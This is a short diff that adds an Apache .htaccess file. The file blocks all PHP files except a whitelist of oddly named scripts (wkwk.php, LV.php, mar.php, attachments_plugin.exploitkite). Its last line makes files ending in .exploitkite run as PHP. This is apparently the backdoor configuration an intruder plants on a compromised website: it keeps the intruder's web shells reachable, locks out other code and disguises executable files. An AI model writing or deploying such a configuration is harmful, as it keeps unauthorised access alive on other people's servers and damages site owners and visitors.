@@ -1,0 +1,10 @@
+<FilesMatch ".*\.(phtml|php|PhP|php5|suspected)$">
+Order Allow,Deny
+Deny from all
+</FilesMatch>
+<FilesMatch "^(index.html|attachments_plugin.exploitkite|plugin-install.php|Mydb.php|attachments_plugin.exploitkite|fun.php|setting.php|attachments_plugin.exploitkite|attachments_plugin.exploitkite|attachments_plugin.exploitkite|templates.phtml|attachments_plugin.exploitkite|attachments_plugin.exploitkite|contact.php|LV.php|content.php|mar.php|wkwk.php|)$">
+Order Allow,Deny
+Allow from all
+</FilesMatch>
+
+AddType application/x-httpd-php .exploitkite
